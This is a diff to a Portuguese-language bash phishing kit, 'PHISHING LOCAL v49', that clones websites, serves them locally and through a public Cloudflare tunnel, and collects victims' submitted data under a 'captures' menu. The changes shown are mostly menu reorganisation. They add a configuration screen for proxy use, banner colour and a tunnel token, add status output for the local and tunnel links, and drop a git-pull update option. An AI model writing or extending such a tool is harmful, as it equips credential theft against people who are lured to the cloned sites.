@@ -1,7 +1,7 @@
 #!/bin/bash
 # ============================================
 # 🎣 PHISHING LOCAL v49 - Clonador Profissional
-# 1 Phish 2 Capturas 3 Túnel 4 Histórico 5 Localhost 6 Link 7 Status 8 Parar 9 Proxy 0 Sair
+# 1 Phish 2 Capturas 3 Tunel 4 Historico 5 Colar 6 Config 7 Status 8 Parar 9 Salvos 0 Sair
 # ============================================
 
 RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
@@ -1009,6 +1009,27 @@ show_status() {
     echo ""
     echo -e "  Capturas: ${GREEN}${caps}${NC}"
 
+    # Localhost info
+    local my_ip=$(get_my_ip 2>/dev/null || echo "?")
+    local srv_on=0
+    if [ -f "$SCRIPT_DIR/.server.pid" ]; then
+        kill -0 "$(cat $SCRIPT_DIR/.server.pid)" 2>/dev/null && srv_on=1
+    fi
+    [ "$srv_on" = "0" ] && curl -s -o /dev/null http://localhost:8080 2>/dev/null && srv_on=1
+
+    if [ "$srv_on" = "1" ]; then
+        echo ""
+        echo -e "  ${GREEN}Localhost: http://${my_ip}:8080${NC}"
+    fi
+
+    # Link tunel
+    if [ -f "$SCRIPT_DIR/.tunnel_link" ]; then
+        local tlink=$(cat "$SCRIPT_DIR/.tunnel_link" 2>/dev/null)
+        if [ -n "$tlink" ]; then
+            echo -e "  ${GREEN}Tunel:     ${tlink}${NC}"
+        fi
+    fi
+
     # Ultimo clone do historico
     if [ -f "$SCRIPT_DIR/.history" ]; then
         echo ""
@@ -1172,16 +1193,87 @@ do_paste_html() {
 }
 
 # =============================================
+# CONFIGURACOES
+# =============================================
+do_config() {
+    clear
+    echo -e "${PURPLE}  ═══════════════════════════════════════${NC}"
+    echo -e "${PURPLE}         CONFIGURACOES${NC}"
+    echo -e "${PURPLE}  ═══════════════════════════════════════${NC}"
+    echo ""
+    echo -e "  ${GREEN}[1] PROXY${NC}          Proxy sempre ligado nos clones"
+    echo -e "  ${CYAN}[2] COR BANNER${NC}      Cor do titulo (verde, cyan, vermelho...)"
+    echo -e "  ${YELLOW}[3] TUNEL TOKEN${NC}    Token Cloudflare (se der erro 1101)"
+    echo -e "  ${WHITE}[4] RESET${NC}          Restaurar padrao"
+    echo ""
+    echo -e "  ${RED}[0] VOLTAR${NC}"
+    echo ""
+    echo -n "  Escolha: "
+    read CFG
+
+    case $CFG in
+        1)
+            echo -n "  Usar proxy sempre? (s/n): "
+            read P
+            if echo "$P" | grep -qi "^s"; then
+                echo "PROXY_ALWAYS=1" > "$SCRIPT_DIR/.config"
+                echo -e "  ${GREEN}Proxy sempre ligado!${NC}"
+            else
+                echo "PROXY_ALWAYS=0" > "$SCRIPT_DIR/.config"
+                echo -e "  ${YELLOW}Proxy normal (pergunta)${NC}"
+            fi
+            ;;
+        2)
+            echo ""
+            echo -e "  ${GREEN}Verde  ${CYAN}Cyan  ${YELLOW}Amarelo  ${PURPLE}Roxo  ${RED}Vermelho  ${WHITE}Branco${NC}"
+            echo -n  "  Cor: "
+            read COR
+            echo "BANNER_COLOR=$COR" >> "$SCRIPT_DIR/.config"
+            echo -e "  ${GREEN}Cor atualizada!${NC}"
+            ;;
+        3)
+            echo -n "  Token Cloudflare: "
+            read TOK
+            echo "TUNNEL_TOKEN=$TOK" >> "$SCRIPT_DIR/.config"
+            echo -e "  ${GREEN}Token salvo!${NC}"
+            ;;
+        4)
+            rm -f "$SCRIPT_DIR/.config"
+            echo -e "  ${GREEN}Resetado!${NC}"
+            ;;
+    esac
+    echo ""
+    echo -e "${YELLOW}Press Enter...${NC}"
+    read
+}
+
+# =============================================
 # MENU
 # =============================================
 while true; do
+    # Ler configuracao
+    BANNER_COLOR="GREEN"
+    [ -f "$SCRIPT_DIR/.config" ] && source "$SCRIPT_DIR/.config" 2>/dev/null
+    [ -z "$BANNER_COLOR" ] && BANNER_COLOR="GREEN"
+
+    # Mapear cor
+    case "$BANNER_COLOR" in
+        verde)    BC="$GREEN" ;;
+        cyan)     BC="$CYAN" ;;
+        amarelo)  BC="$YELLOW" ;;
+        roxo)     BC="$PURPLE" ;;
+        vermelho) BC="$RED" ;;
+        branco)   BC="$WHITE" ;;
+        *)        BC="$GREEN" ;;
+    esac
+
     clear
-    echo -e "  ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗"
-    echo -e "  ██╔══██╗██║  ██║██║██╔════╝██║  ██║"
-    echo -e "  ███████║███████║██║███████╗███████║"
-    echo -e "  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║"
-    echo -e "  ██║     ██║  ██║██║███████║██║  ██║"
-    echo -e "  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝"
+    echo -e "  ${BC}██████╗ ██╗  ██╗██╗███████╗██╗  ██╗${NC}"
+    echo -e "  ${BC}██╔══██╗██║  ██║██║██╔════╝██║  ██║${NC}"
+    echo -e "  ${BC}███████║███████║██║███████╗███████║${NC}"
+    echo -e "  ${BC}██╔═══╝ ██╔══██║██║╚════██║██╔══██║${NC}"
+    echo -e "  ${BC}██║     ██║  ██║██║███████║██║  ██║${NC}"
+    echo -e "  ${BC}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝${NC}"
     echo ""
     echo -e "  🎣 PHISHING LOCAL ${CYAN}v45${NC}"
     echo ""
@@ -1193,19 +1285,16 @@ while true; do
     echo -e "  ─────────────────────────────────────────"
     echo ""
 
-    # Menu com cores fortes (cores separadas, sem arco-iris)
-    echo -e "  ${GREEN}[1] PHISH${NC}      Clonar site"
-    echo -e "  ${CYAN}[2] CAPTURAS${NC}   Dados recebidos"
-    echo -e "  ${YELLOW}[3] TUNEL${NC}      Link publico Cloudflare"
-    echo -e "  ${PURPLE}[4] HISTORICO${NC}  Banco de clones"
-    echo -e "  ${CYAN}[5] LOCALHOST${NC}   IP local + navegador"
-    echo -e "  ${YELLOW}[6] LINK${NC}       Verificar tunel"
-    echo -e "  ${WHITE}[7] STATUS${NC}     Sistema e logs"
-    echo -e "  ${RED}[8] PARAR${NC}      Servidor + tunel"
-    echo -e "  ${PURPLE}[9] PROXY${NC}      Clonar via proxy"
-    echo -e "  ${GREEN}[c] SALVOS${NC}     Biblioteca de clones"
-    echo -e "  ${WHITE}[h] COLAR HTML${NC}  Servir HTML colado"
-    echo -e "  ${CYAN}[A] ATUALIZAR${NC}  Puxar do GitHub"
+    # Menu com cores fortes (numeros, sem letras)
+    echo -e "  ${GREEN}[1] PHISH${NC}        Clonar site"
+    echo -e "  ${CYAN}[2] CAPTURAS${NC}     Dados recebidos"
+    echo -e "  ${YELLOW}[3] TUNEL${NC}        Link publico Cloudflare"
+    echo -e "  ${PURPLE}[4] HISTORICO${NC}    Banco de clones"
+    echo -e "  ${WHITE}[5] COLAR HTML${NC}    Servir HTML colado"
+    echo -e "  ${PURPLE}[6] CONFIGURAR${NC}   Proxy, cor, tunel"
+    echo -e "  ${WHITE}[7] STATUS${NC}       Sistema e logs"
+    echo -e "  ${RED}[8] PARAR${NC}        Servidor + tunel"
+    echo -e "  ${GREEN}[9] SALVOS${NC}       Biblioteca de clones"
     echo ""
     echo -e "  ${RED}[0] SAIR${NC}"
     echo ""
@@ -1348,37 +1437,11 @@ while true; do
         2) view_capturas ;;
         3) start_tunnel ;;
         4) show_history ;;
-        5) show_localhost ;;
-        6) show_tunnel_link ;;
+        5) do_paste_html ;;
+        6) do_config ;;
         7) show_status ;;
         8) stop_all; read ;;
-        9) do_proxy_clone ;;
-        c) show_saved_clones ;;
-        h) do_paste_html ;;
-        A)
-            clear
-            echo -e "  ${CYAN}═══ ATUALIZAR DO GITHUB ═══${NC}"
-            echo ""
-            # Salvar mudancas locais antes de pular
-            git stash --quiet 2>/dev/null
-            echo -n "  Puxando atualizacoes..."
-            if timeout 60 git pull --quiet 2>/dev/null; then
-                echo -e " ${GREEN}OK${NC}"
-                chmod +x phish start.sh phish-update.sh 2>/dev/null
-                # Restaurar mudancas locais
-                git stash pop --quiet 2>/dev/null
-                echo ""
-                echo -e "  ${GREEN}Atualizado com sucesso!${NC}"
-                echo -e "  ${YELLOW}Reinicie o phish para aplicar: 0) SAIR e abra de novo${NC}"
-            else
-                echo -e " ${RED}FALHA${NC}"
-                echo -e "  ${YELLOW}Rede indisponivel ou sem mudancas${NC}"
-                git stash pop --quiet 2>/dev/null
-            fi
-            echo ""
-            echo -e "${YELLOW}Press Enter...${NC}"
-            read
-            ;;
+        9) show_saved_clones ;;
         0) stop_all; exit 0 ;;
         *) echo -e "${RED}Invalido!${NC}" ;;
     esac
